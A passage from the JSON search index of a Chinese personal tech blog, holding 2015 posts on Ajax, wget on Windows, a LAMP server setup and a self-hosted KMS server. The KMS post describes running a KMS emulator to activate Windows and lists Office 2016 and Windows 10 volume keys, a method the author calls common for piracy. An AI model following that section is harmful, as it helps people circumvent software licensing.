GUI设计的小文章0.0也许是virtualenv的随手记吧。","categories":[{"name":"随手记","slug":"随手记","permalink":"https://blog.stdioa.com/categories/随手记/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"pip","slug":"pip","permalink":"https://blog.stdioa.com/tags/pip/"}]},{"title":"点点技能点之Ajax","slug":"essay-ajax","date":"2015-09-22T13:07:00.000Z","updated":"2018-07-12T00:15:06.869Z","comments":true,"path":"2015/09/essay-ajax/","link":"","permalink":"https://blog.stdioa.com/2015/09/essay-ajax/","excerpt":"之前自己没怎么写过前端，一直以为Ajax写起来很麻烦，也没怎么接触Ajax，今天写了个小网页用到了Ajax，感觉它并不是想象的那么复杂，写完网页随手总结一下。（喂我这个技能点是不是点的太晚了啊！）","text":"之前自己没怎么写过前端，一直以为Ajax写起来很麻烦，也没怎么接触Ajax，今天写了个小网页用到了Ajax，感觉它并不是想象的那么复杂，写完网页随手总结一下。（喂我这个技能点是不是点的太晚了啊！） 1. 引子没啥可写的… 2. 科普W3School - Ajax教程，就这个吧，科普完毕。 3. 笔记 3.1 Ajax的特点Ajax为Asynchronous Javascript And XML的缩写，即异步JS与XML，因为它具有异步特性，所以我们可以在网页加载中或加载结束的任意时刻使用，通过与服务器进行少量数据交换来实现网页异步更新。利用Ajax可以直接更改网页的一部分来动态刷新网页，而不需要刷新整个网页。 3.2 使用方法——原生方式1234567891011var ajax = new XMLHttpRequest(); // IE6不能用这个方式，不管它了ajax.onreadystatechange = function() &#123; if(ajax.readyState==4 &amp;&amp; ajax.status==200) &#123; // do something with ajax.responseText // 还有一个ajax.responseXML, 也不管它了，json大法好 alert(ajax.responseText); &#125;&#125;ajax.open(\"GET\", \"./get?var1=val1&amp;var2=val2\", true); // 异步方式运行ajax.send();123456var ajax = new XMLHttpRequest();ajax.open(\"POST\", \"./post\", false); // 同步方式运行ajax.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\");ajax.send(\"var1=val1&amp;var2=val2\");// do something with ajax.responseTextalert(ajax.responseText); 3.3 原生的好麻烦！——jQuery AjaxjQuery，棒棒的前端库，不多说。1234567891011121314151617// $.get(URL, callback)$.get(\"./get?var1=val1&amp;var2=val2\", function(data, status) &#123; // do something with data &amp; status &#125;);// $.post(URL,data,callback)$.post(\"./post\", &#123; var1: \"val1\", var2: \"val2\" &#125;, function(data, status) &#123; // do something with data &amp; status &#125;);// $.getJSON(url, data, success(data,status,xhr))// data和回调函数success可选// success中，data参数必需，其它可选$.getJSON(\"./get\", function(data) &#123; // do something with data &#125;); 4. 附带的小零碎window.setInterval(getData, time);用于实现轮询。 5. 总结 &amp; 后记Ajax简单实用功能强大应用广泛，通过简单的步骤实现前后端的数据交换，来实现网页的动态加载。开学到现在感觉一直不在状态（实在是想吐槽自己的一群神一样的舍友），今天找了个安静的、没人打扰的地方认认真真写了写代码，总结了一下自己到现在所学的知识才发现自己学的东西是如此零散、不成体系，仿佛从大一开始就在乱点技能点。这一年要多深入学习一个特定方面的知识（暂定后端开发），多写代码积累经验，不能再东学一点西学一点了。","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.stdioa.com/categories/网络/"}],"tags":[{"name":"Ajax","slug":"Ajax","permalink":"https://blog.stdioa.com/tags/Ajax/"},{"name":"前端开发","slug":"前端开发","permalink":"https://blog.stdioa.com/tags/前端开发/"}]},{"title":"在Windows中使用Wget","slug":"using-wget-in-Windows","date":"2015-09-18T12:07:00.000Z","updated":"2018-07-12T00:14:30.506Z","comments":true,"path":"2015/09/using-wget-in-Windows/","link":"","permalink":"https://blog.stdioa.com/2015/09/using-wget-in-Windows/","excerpt":"一直心心念念想在Windows里用wget，今天随便搞了搞，在Windows里面用上了wget，终于可以下载一些乱七八糟的小文件辣。","text":"一直心心念念想在Windows里用wget，今天随便搞了搞，在Windows里面用上了wget，终于可以下载一些乱七八糟的小文件辣。 1. 引子一直觉得Windows里面应该有一个类似wget的工具。今天想从github上下一个文件，结果文件直接以文本方式返回了(响应头的Content-Type为text/plain而不是application神马的)，自己很怨念，觉得要是Windows能像linux一样有个用来wget神马的下载文件的命令就好了…所以自己上网搜了一下，让自己用上了wget. 2. 乱搞随便百度，找到一篇博文，又找到了一个叫做GnuWin(http://sourceforge.net/projects/gnuwin32/)的项目，该项目主要提供Windows下的GNU工具，比如sed, grep, wget等等。于是下载安装，安装程序默认将程序安装在了C:\\Program Files (x86)\\GnuWin32\\bin目录下。然而即使这样，我还是无法直接在命令行里使用。Windows中有一个“PATH环境变量”，将某目录（比如C:\\Python27）添加进PATH环境变量中，就可以直接在命令行中输入命令打开该目录下的文件。如果想在命令行中使用wget的话，把C:\\Program Files (x86)\\GnuWin32\\bin目录添加进PATH变量中当然可行。但是这样的话，随着工具越来越多，PATH变量里面的路径也就越来越多，维护起来也会更加困难，所以自己使用了一种特殊的方法：在C盘的目录下建了一个Command_line_programs文件夹用来放一些自己常用的命令行工具（比如sqlite），然后将C:\\Command_line_programs（以下简称C.L.P.）添加到PATH变量中，这样自己就能使用C.L.P.文件夹中的工具。可是，自己已经将程序安装到Program Files里了，所以需要想个办法在C.L.P.文件中新建一个文件来连接到wget程序。_经过尝试，使用快捷方式的方法失败了。_所以自己想到了新建批处理文件。于是在C.L.P.文件夹中新建wget.bat, 内容为C:\\&quot;Program Files (x86)&quot;\\GnuWin32\\bin\\wget.exe %* （%*表示在命令中嵌入程序所有参数，详情请百度或Google Windows批处理编程），保存，在命令行中尝试使用wget，成功。 3. 然而这并没有什么卵用啊！自己搞完以后，盯着GnuWin这几个字，突然想到了git里面自带了很多GNU工具可以直接使用，于是就去git/bin的目录翻了翻，果然，里面没有wget，然而我看到了curl。然后…就没有然后了。 4. 后记这篇文章是胡乱凑数的，最近学习兴趣不高，又有一堆乱七八糟的事情要忙，所以托更了好久T^T好了好了要好好学习，说好了多去体验框架呢QAQ","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://blog.stdioa.com/tags/Windows/"},{"name":"wget","slug":"wget","permalink":"https://blog.stdioa.com/tags/wget/"}]},{"title":"搭建私有KMS服务器","slug":"building-a-private-kms-server","date":"2015-09-02T14:26:00.000Z","updated":"2018-07-12T00:15:10.724Z","comments":true,"path":"2015/09/building-a-private-kms-server/","link":"","permalink":"https://blog.stdioa.com/2015/09/building-a-private-kms-server/","excerpt":"最近win10又频繁提示“许可即将过期”，之前找到的kms服务器又挂掉了，于是就决定自己搭一个自己用。","text":"最近win10又频繁提示“许可即将过期”，之前找到的kms服务器又挂掉了，于是就决定自己搭一个自己用。 1. 引子好久没更新日志了，暑假在家每天过的乱七八糟，就没怎么研究技术，于是博客也没怎么更新…今天随便写点什么凑个数_(:зゝ∠)_ 2. 科普KMS (Key Management Service), 密钥管理服务，是一种对Windows及Office产品进行批量授权的服务，通常被部署在大型企业局域网中，用于对批量授权版（即VOL版）Windows系统进行大批量的激活。KMS服务器的作用是给局域网中的所有计算机的操作系统提供一个有效的产品序列号，然后计算机里面的KMS服务就会自动将系统激活。每一个由KMS Server提供的序列号的有效期只有180天，而不是其他版本的永久使用一个序列号。所以操作者必须在快到期的时候在此手动连接KMS服务器让它提供一个新的序列号，否则180天以后就会回到试用版本状态。由于KMS系统部署较为容易，所以在国内很多人通过MSDN等渠道下载VOL版本的软件，然后通过KMS服务进行激活，已达到盗版的目的。 3. 搭(luan)建(gao)过程昨天在满大街乱找野生KMS服务器的时候发现了一个帖子：使用KMS激活windows系统及VL-office系列, 里面提供了一个链接指向一个帖子，帖子中提供了Python和C版本的KMS服务器模拟器，可以在自己的服务器中进行KMS服务器部署。于是把代码搞了下来（为此还注册了个账号, python版的代码在这里)，用VSFTP将代码传到了自己的树莓派上，然后运行python server.py进行部署。python server.py TCP server listening at 0.0.0.0 on port 1688. 然后在Windows系统中打开具有管理员权限的命令提示符，输入slmgr -skms 192.168.155.2:1688设置KMS服务器地址（地址可以更换），然后输入`slmgr -ato’进行系统激活，此时服务器端显示：Connection accepted: 192.168.56.1:13023 Received V6 request on Wed Sep 2 22:59:55 2015. Connection closed: 192.168.56.1:13023 Windows系统提示“成功地激活了产品”，激活成功。在树莓派上部署成功以后，随手在VPS上部署了一份以备用。帖子中提了一种设置Linux系统启动项来使KMS服务器开机自动部署的方法，不过自己没有这个需求就没搞。 4. 总结这篇文章好像有点水，主要是因为自己实在没什么东西写了…自己的暑假过的乱七八糟，浪费了很多时间在游戏上，没什么心情研究技术。现在开学了，有更多时间来钻研技术了，收收心找找状态，以后博客会定期更新的，我对树莓派电源灯发誓→_→ 5. 各种Key最后附上Office 2016和Windows 10的VOL版激活码，其它版本软件激活码请自行百度。Office Professional Plus 2016 - XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99Office Standard 2016 - JNRGM-WHDWX-FJJG3-K47QV-DRTFMProject Professional 2016 - YG9NW-3K39V-2T3HJ-93F3Q-G83KTProject Standard 2016 - GNFHQ-F6YQM-KQDGJ-327XX-KQBVCVisio Professional 2016 - PD3PC-RHNGV-FXJ29-8JK7D-RJRJKVisio Standard 2016 - 7WHWN-4T7MP-G96JF-G33KR-W8GF4Access 2016 - GNH9Y-D2J4T-FJHGG-QRVH7-QPFDWExcel 2016 - 9C2PK-NWTVB-JMPW8-BFT28-7FTBFOneNote 2016 - DR92N-9HTF2-97XKM-XW2WJ-XW3J6Outlook 2016 - R69KK-NTPKF-7M3Q4-QYBHW-6MT9BPowerPoint 2016 - J7MQP-HNJ4Y-WJ7YM-PFYGF-BY6C6Publisher 2016 - F47MM-N3XJP-TQXJ9-BP99D-8K837Skype for Business 2016 - 869NQ-FJ69K-466HW-QYCP2-DDBV6Word 2016 - WXY84-JN2Q9-RBCCQ-3Q3J3-3PFJ6Windows 10 Home - TX9XD-98N7V-6WMQ6-BX7FG-H8Q99Windows 10 Home N - 3KHY7-WNT83-DGQKR-F7HPR-844BMWindows 10 Home Single Language - 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFHWindows 10 Home Country Specific - PVMJN-6DFY6-9CCP6-7BKTT-D3WVRWindows 10 Professional - W269N-WFGWX-YVC9B-4J6C9-T83GXWindows 10 Professional N - MH37W-N47XK-V7XM9-C7227-GCQG9Windows 10 Education - NW6C2-QMPVW-D7KKK-3GKT6-VCFB2Windows 10 Education N - 2WH4N-8QGBV-H22JP-CT43Q-MDWWJWindows 10 Enterprise - NPPR9-FWDCX-D2C8J-H872K-2YT43Windows 10 Enterprise N - DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4Windows 10 Enterprise 2015 LTSB - WNMTR-4C88C-JK8YV-HQ7T2-76DF9Windows 10 Enterprise 2015 LTSB N - 2F77B-TNFGY-69QQF-B8YKP-D69TJ可以考虑有空搞一个Office 2016来玩玩。 6. 参考文档KMS - 互动百科使用KMS激活windows系统及VL-office系列Emulated KMS Servers on non-Windows platforms","categories":[{"name":"乱七八糟","slug":"乱七八糟","permalink":"https://blog.stdioa.com/categories/乱七八糟/"}],"tags":[{"name":"KMS","slug":"KMS","permalink":"https://blog.stdioa.com/tags/KMS/"}]},{"title":"LAMP环境搭建心得","slug":"deploy-a-LAMP-environment","date":"2015-07-09T12:05:00.000Z","updated":"2018-07-12T11:35:13.415Z","comments":true,"path":"2015/07/deploy-a-LAMP-environment/","link":"","permalink":"https://blog.stdioa.com/2015/07/deploy-a-LAMP-environment/","excerpt":"闲来无事，在虚拟机上搭了一个LAMP服务器环境，把安装及配置过程记了下来。","text":"闲来无事，在虚拟机上搭了一个LAMP服务器环境，把安装及配置过程记了下来。 1. 引子 1.1 环境版本此次搭建的LAMP环境版本：Ubuntu 14.04 LTSApache 2.4.7mysql 5.6.19php 5.5.9 1.2 写(hu)在(che)开(yi)头(tong)额…其实没什么好说的，自己一直想自己动手搭建、配置一个服务器，暑假之前师太（别问是谁）说如果要搞安全的话最好先自己从头搭一个服务器，把各种服务弄清楚，对整个架构有一个系统的理解，这样再深入搞安全的话接受一些观念也会更快更容易；但是因为自己太懒，再加上上学期忙成狗（其实还是太懒），一直没有去做这件事。暑假在一个小公司做软件测试，每天好像也没什么事干，有大把的时间做自己的事情，于是自己用了一中午加半个下午的时间照着一份指南把它搭好了。 不过话说回来，软件测试真的很无聊_(:зゝ∠)_ 2. 科普LAMP: Linux + Apache + Mysql + PHP科普结束。刚看到LAMP里面的P还能指Python 0.0 3. 搭建过程 3.1 安装Linux我手上现在没实体机了，只有一个树莓派，我也不想每天带着它去上班，何况AMD架构上面软件好像少一点点，更何况树莓派性能挺差的（此处省略一坨借口），所以我只用Virtual Box装了一个虚拟机。说到Linux，选一个用起来比较舒服的的发行版还是挺重要的。Linux发行版众多，一般用Red Hat或者CentOS（RH的社区版）或者Ubuntu Server来做服务器，不过…这学期用Debian系发行版用习惯了，再换到RH系的感觉有点不适应，于是我选择了Ubuntu Server. 当然，如果你想锻炼一下，推荐使用Arch Linux来搭建服务器。下载Linux镜像，搭虚拟机，配置虚拟网络&amp;SSH，更改软件源，更新软件，配置自己需要的vim &amp; tmux &amp; vsftpd，不多说，想详细了解的可以去看某Linux虚拟机安装及配置指南（代号PA0）。上学期装Linux装了绝不下10遍，再说下去自己都要吐了。不过值得一提的是，Ubuntu Server安装程序的用户体验简直棒，安装过程中有一步是设置键盘布局，以前都要自己去一个长长的列表里翻自己的键盘布局（通常是US），而Ubuntu Server提供了一个小脚本来进行自动检测：依照提示敲几个字母/符号，再回答一个问题，安装程序会自动检测出适合你的键盘布局。Apache输入apt-get install apache2命令安装apache.安装过程中apache服务已经启动，如果未启动，则输入service apache2 start启动apache服务。启动后访问服务器ip，会出现apache的测试页面。MySQL输入apt-get install mysql-server-5.6 mysql-client-5.6进行安装。安装过程中需要输入MySQL root密码。PHP输入apt-get install php5 libapache2-mod-php5安装php, 安装过后需要输入service apache2 restart重启apache服务。 3.2 配置安装phpMyAdmin输入apt-get install phpmyadmin进行安装，安装的时候会提示输入mysql的root密码，并且提示新建一个数据库，当然也可以按需求不新建。安装好以后访问http://localhost/phpmyadmin/index.php ，登录之后页面下方会有警告“缺少 mcrypt 扩展。请检查 PHP 配置。”此时按照指南的方法做没有效果，经百度+Google后找到了解决方案：安装php5-mcrypt后，更改php.ini后问题未解决，根据官方的mcrypt安装指南，输入php5enmod mcrypt后，问题解决。MySQL命令行无法启动注：这段是自己瞎折腾的，啥都没看就乱玩遇到的问题。输入mysql后遇到问题：12➜ ~ mysqlERROR 1045 (28000): Access denied for user &apos;stdio&apos;@&apos;localhost&apos; (using password: NO)尝试用root权限运行，得到同样的结果。12➜ ~ sudo mysqlERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: NO)一番百度+google+SegmentFault后，找到正确进入命令行的姿势：123456789101112131415➜ ~ sudo mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 55Server version: 5.6.19-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt;设置Apache虚拟目录把所有文件全部放在/var/www下真的好麻烦，何况普通账户没有/var/www的写权限，所以设置一个alias，将某个Apache虚拟目录映射到home目录下，以后操作起来就会方便很多。修改/etc/apache2/mods-enabled/alias.conf文件，添加如下行，然后重启Apache服务：12345678Alias /web &quot;/home/stdio/websites/&quot;&lt;Directory &quot;/home/stdio/websites/&quot;&gt; Options None AllowOverride None Order allow,deny Allow from all&lt;/Directory&gt;然而在我访问http://localhost/web时，却得到了503 Forbidden的状态码，各种乱访问无果，于是在网上乱搜解决方案，有让改httpd的（httpd跟Apache有啥关系），有改alias配置的（我的alias配置的没有问题啊），最后看到了一个方案，查看apache2.conf的目录权限配置。修改/etc/apache2/apache2.conf文件，发现以下设置：12345678910111213141516&lt;Directory /&gt; Options FollowSymLinks AllowOverride None Require all denied&lt;/Directory&gt;&lt;Directory /usr/share&gt; AllowOverride None Require all granted&lt;/Directory&gt;&lt;Directory /var/www/&gt; Options Indexes FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;因为Apache的默认配置是不能访问/的，所以我没有对~/websites的访问权限（这里逻辑好混乱）。添加配置：12345&lt;Directory /home/stdio/websites&gt; Options FollowSymLinks AllowOverride None Require all granted&lt;/Directory&gt;重启Apache服务，http://localhost/web目录下的文件均可正常访问。 4. 乱搞去年开学的时候用php写过一个小的文件浏览器（就像Apache自带的文件服务器那样的），闲得无聊想把它部署到自己刚搭好的服务器上，看看能不能正常运行，于是就把文件传到服务器上访问，不出意外，失败了。然后就找呀找呀找bug，找到一个小bug（请自动脑补背景音乐），找了半个点最后发现，在从配置文档读取根目录路径的时候，会在目录结尾加一个空格（现在想起来觉得应该是^M）导致路径拼接时出错，于是在$rootpath前面加了trim，然后就好了…我真是能作_(:зゝ∠)_ 5. 总结自己动手搭建LAMP环境还是一件挺有意思的事情，遇到问题自己去找答案自己解决，最后所有的服务全都正常运行时还是有一点点成就感的~半年没碰PHP，一共就写了不到10行代码，还写错了一半，比如把phpinfo()写成php_info，忘了在&lt;?后面加php神马的…（我记得以前谁跟我说&lt;?后面可以不加php的啊）一篇文章写了一晚上。好久没写过博文了，写这篇文章主要是把自己的经验记下来，如果这篇文章可以帮到谁的话，那当然更好~Linux挺好玩的，比软件测试好玩多了！（果然到了最后还是要黑一把测试） 6. 参考文档ubuntu下搭建LAMPPHP Mcrypt Installing/Configuringapache服务出现Forbidden 403问题的解决方法总结ERROR 1045 (28000): Access denied for user ‘root’@‘localhost’ (using password: NO)","categories":[{"name":"网络","slug":"网络","permalink":"https://blog.stdioa.com/categories/网络/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://blog.stdioa.com/tags/MySQL/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.stdioa.com/tags/Linux/"},{"name":"Apache","slug":"Apache","permalink":"https://blog.stdioa.com/tags/Apache/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.stdioa.com/tags/PHP/"}]}]}